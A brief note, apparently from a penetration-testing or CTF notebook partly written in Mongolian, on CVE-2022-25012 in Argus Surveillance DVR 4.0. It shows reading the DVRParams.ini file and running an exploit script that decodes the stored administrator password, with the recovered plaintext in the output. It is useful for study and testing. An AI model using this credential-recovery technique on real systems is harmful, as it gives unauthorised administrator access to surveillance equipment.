# Argus Surveillance DVR 4.0 - Weak Password Encryption

Reference: https://www.exploit-db.com/exploits/50130

Administrator нууц үгийг доорх замын дагуу олоод тайлна:

```cmd
C:> type "C:\programdata\PY_Software\Argus Surveillance DVR\DVRParams.ini"
```

[image]

```bash
python2 cve-2022-25012.py ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[+] D9A8:$
[+] Password: 14WatchD0g$
```
